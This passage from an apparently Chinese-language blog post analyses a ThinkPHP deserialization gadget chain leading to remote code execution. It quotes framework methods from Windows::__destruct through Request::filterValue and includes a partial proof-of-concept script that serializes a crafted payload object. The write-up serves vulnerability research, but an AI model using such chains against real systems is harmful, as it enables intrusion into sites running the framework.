class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$name</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;data)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;relation)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;relation[<span class="hljs-variable">$name</span>];<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">&#x27;property not exists:&#x27;</span> . <span class="hljs-built_in">static</span>::<span class="hljs-variable language_">class</span> . <span class="hljs-string">&#x27;-&gt;&#x27;</span> . <span class="hljs-variable">$name</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们会发现报错的地方就在这里，这里的三个<code>if</code>条件都没有进去，第一个<code>if</code>不进去是因为这里的<code>$name</code>显然不为<code>null</code>，而我们也不能使得<code>$name</code>为<code>null</code>，否在会在更前面报错；</p><p>接下来就思考如何进入下面的两个<code>if</code>条件。但这也简单，顾名思义，<code>$this-&gt;data</code>需要存在一个键为<code>$name</code>的数组，即<code>$name=&gt;xxxx</code>形式，修改POC，继续尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Pivot</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;0.&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;data = [<span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;123&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br>&#125;<br></code></pre></td></tr></table></figure><p>发现此时成功进入语句<code>$relation-&gt;visible([$attr]);</code></p><p>![](img&#x2F;截屏2023-10-08 13.27.17.png)</p><p>并且<code>$relation</code>的值也知道，就是我们自己设置的<code>123</code>。那么待会就可以把<code>123</code>替换为一个对象，利用语句<code>$relation-&gt;visible([$attr]);</code>调用其他类的<code>visible</code>方法，或者调用<code>__call</code>方法。</p><p>经过排查后，发现其他类的<code>visible</code>方法都不好利用，于是考虑<code>__call</code>方法，</p><p>这里选择<code>think\Request</code>类的<code>__call方法</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$this</span>-&gt;hook)) &#123;<br>        <span class="hljs-title function_ invoke__">array_unshift</span>(<span class="hljs-variable">$args</span>, <span class="hljs-variable">$this</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;hook[<span class="hljs-variable">$method</span>], <span class="hljs-variable">$args</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;method not exists:&#x27;</span> . <span class="hljs-built_in">static</span>::<span class="hljs-variable language_">class</span> . <span class="hljs-string">&#x27;-&gt;&#x27;</span> . <span class="hljs-variable">$method</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看到了<code>call_user_func_array</code>函数，但是依然不能高兴太早。</p><p>当我们进入此方法时，<code>$method</code>是<code>visible</code>，<code>$args</code>是<code>null</code>，因为<code>$this-&gt;hook</code>可控，所以最开始的<code>if</code>条件容易过，但关键是<code> array_unshift($args, $this)</code>,这条语句会把<code>$this</code>插入<code>args</code>的首位，让<code>args</code>由空数组变为<code>[0] =&gt; &quot;think\Request&quot;</code>，这就使得<code>call_user_func_array($this-&gt;hook[$method], $args)</code>的参数不可控，就没那么容易调用<code>system</code>函数直接RCE了。</p><p>但好在<code>$this-&gt;hook</code>是可控的，<code>$method</code>是已知的，也就意味着<code>$this-&gt;hook[$method]</code>是可控，也就是我们可以调用任何一个函数，只不过参数不可控。</p><p>梳理一下目前的成果：</p><p>我们以<code>Windows</code>类的<code>__destruct()</code>为入口，利用其中<code>removeFiles()</code>里的<code>file_exists()</code>函数，此函数会把对象当字符串使用，于是利用<code>trait Conversion</code>的<code>__toString()</code>，以实现了此trait的<code>think\model\Pivot</code>来实例化对象，并经过调试成功进入此语句<code>call_user_func_array($this-&gt;hook[$method], $args);</code></p><h2 id="filterValue"><a href="#filterValue" class="headerlink" title="filterValue"></a>filterValue</h2><p>现在我们可以调用任意一个函数，但问题就在于参数不可控，所以我们需要另寻他路。</p><p>我们把目光聚焦于该类的<code>filterValue</code>方法，事实上<code>ThinkPHP</code>许多RCE都与此方法有关</p><p>此方法代码也很多，但关键只在于前面几句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterValue</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$filters</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$filters</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filters</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>            <span class="hljs-comment">// 调用函数或者方法过滤</span><br>            <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br>          ·······<br></code></pre></td></tr></table></figure><p>要利用的方法就是这里的<code>$value = call_user_func($filter, $value);</code>是的，虽然之前找到的<code>call_user_func_array</code>很香，但是奈何无法控制参数，只能当做跳板，转寻其他的<code>call_user_func</code>，于是乎就利用<code>filterValue</code>里面的<code>call_user_func</code></p><p>但问题又在于，这里的参数<code>$filter</code>和<code>$value</code>仍然不可控，还得继续找，看有没有其他方法使用了此函数</p><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>继续寻找到方法<code>input()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">input</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = [], <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$name</span>) &#123;<br>         <span class="hljs-comment">// 获取原始数据</span><br>         <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>     &#125;<br><br>     <span class="hljs-variable">$name</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;&#x27;</span> != <span class="hljs-variable">$name</span>) &#123;<br>         <span class="hljs-comment">// 解析name</span><br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;<br>             <span class="hljs-keyword">list</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$type</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$name</span>);<br>         &#125;<br><br>         <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$name</span>);<br><br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$data</span>)) &#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$default</span>;<br>         &#125;<br><br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$data</span>)) &#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>         &#125;<br>     &#125;<br><br>     <span class="hljs-comment">// 解析过滤器</span><br>     <span class="hljs-variable">$filter</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span>);<br><br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], <span class="hljs-variable">$filter</span>);<br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="hljs-string">&#x27;7.1.0&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>)) &#123;<br>             <span class="hljs-comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br>             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">arrayReset</span>(<span class="hljs-variable">$data</span>);<br>         &#125;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filterValue</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$filter</span>);<br>     &#125;<br><br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$type</span>) &amp;&amp; <span class="hljs-variable">$data</span> !== <span class="hljs-variable">$default</span>) &#123;<br>         <span class="hljs-comment">// 强制类型转换</span><br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">typeCast</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$type</span>);<br>     &#125;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br> &#125;<br><br></code></pre></td></tr></table></figure><p>代码量中规中矩，这里的关键在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filter</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], <span class="hljs-variable">$filter</span>);<br></code></pre></td></tr></table></figure><p>这里会调用之前的<code>filterValue</code>函数，并且<code>$filter</code>是由<code> $filter = $this-&gt;getFilter($filter, $default)</code>得到，看一下函数<code>getFilter()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilter</span>(<span class="hljs-params"><span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>        <span class="hljs-variable">$filter</span> = [];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$filter</span> = <span class="hljs-variable">$filter</span> ?: <span class="hljs-variable language_">$this</span>-&gt;filter;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$filter</span>) &amp;&amp; <span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$filter</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$filter</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$filter</span> = (<span class="hljs-keyword">array</span>) <span class="hljs-variable">$filter</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$filter</span>[] = <span class="hljs-variable">$default</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$filter</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单审计一下就知道这个函数就是返回<code>$this-&gt;filter</code></p><p>那么此时<code>$this-&gt;filter</code>算是可控了</p><p>但是这里还有问题没有解决，就是<code>  array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code>这里面的<code>$data</code>仍然不可控，就需要继续找函数，看看有没有哪个方法调用<code>input</code></p><h2 id="param"><a href="#param" class="headerlink" title="param"></a>param</h2><p>经过查找，发现<code>$this-&gt;param()</code>方法可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">param</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;mergeParam) &#123;<br>        <span class="hljs-variable">$method</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">method</span>(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 自动获取请求变量</span><br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$method</span>) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;POST&#x27;</span>:<br>                <span class="hljs-variable">$vars</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PUT&#x27;</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;DELETE&#x27;</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PATCH&#x27;</span>:<br>                <span class="hljs-variable">$vars</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-variable">$vars</span> = [];<br>        &#125;<br><br>        <span class="hljs-comment">// 当前请求参数和URL地址中的参数合并</span><br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-literal">false</span>), <span class="hljs-variable">$vars</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-literal">false</span>));<br><br>        <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$name</span>) &#123;<br>        <span class="hljs-comment">// 获取包含文件上传信息的数组</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file</span>();<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>) ? <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$file</span>) : <span class="hljs-variable language_">$this</span>-&gt;param;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span>, <span class="hljs-variable">$filter</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$default</span>, <span class="hljs-variable">$filter</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>留意最后一句的<code> $this-&gt;input($this-&gt;param, $name, $default, $filter);</code>，这里就能控制<code>$this-&gt;param</code>参数，进而可以控制<code>input()</code>里的<code>$data</code>参数，</p><p>但要留意在这之前还有这么一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当前请求参数和URL地址中的参数合并</span><br>            <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-literal">false</span>), <span class="hljs-variable">$vars</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure><p>也就是会和<code>get</code>请求的参数合并，不过这里不是什么大事，仍然都是可控的。</p><p>然而还有一个问题，就是这里的<code>$name</code>依然是不可控的，依旧是类<code>think\request</code>，这就导致<code>input()</code>函数里面<code> $name = (string) $name;</code>会报错，也就是说，我们还需要找一个函数来控制<code>$name</code></p><h2 id="isAjax"><a href="#isAjax" class="headerlink" title="isAjax"></a>isAjax</h2><p>这里就找到了<code>$this-&gt;isAjax()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAjax</span>(<span class="hljs-params"><span class="hljs-variable">$ajax</span> = <span class="hljs-literal">false</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$value</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">server</span>(<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;xmlhttprequest&#x27;</span> == <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$value</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$ajax</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$result</span>           = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;var_ajax&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-variable">$result</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到<code>$result = $this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;</code>，这里我们终于可以控制<code>param()</code>的第一个参数。整个链子也就通畅了。</p><p>第一波梳理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">我们以`Windows`类的`<span class="hljs-title function_ invoke__">__destruct</span>()`为入口，利用其中`<span class="hljs-title function_ invoke__">removeFiles</span>()`里的`<span class="hljs-title function_ invoke__">file_exists</span>()`函数，此函数会把对象当字符串使用，于是利用`<span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Conversion</span>`的`<span class="hljs-title">__toString</span>()`，以实现了此<span class="hljs-title">trait</span>的`<span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>`来实例化对象，并经过调试成功进入此语句`<span class="hljs-title">call_user_func_array</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">hook</span>[$<span class="hljs-title">method</span>], $<span class="hljs-title">args</span>);`</span><br></code></pre></td></tr></table></figure><p>第二波梳理：</p><p>我们可以调用任意函数，但参数不可控，于是需要寻找其他函数来实现目的。</p><p>想利用<code>filterValue()</code>里的<code>call_user_func($filter, $value)</code>，但两个参数都不可控，往上寻找函数，看谁调用此函数，并借此控制参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterValue</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$filters</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$filters</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filters</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>            <span class="hljs-comment">// 调用函数或者方法过滤</span><br>            <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br></code></pre></td></tr></table></figure><p>找到<code>input()</code>函数，并且<code>$filter</code>可控，但<code>$data</code>不可控，继续往上找函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">input</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = [], <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> 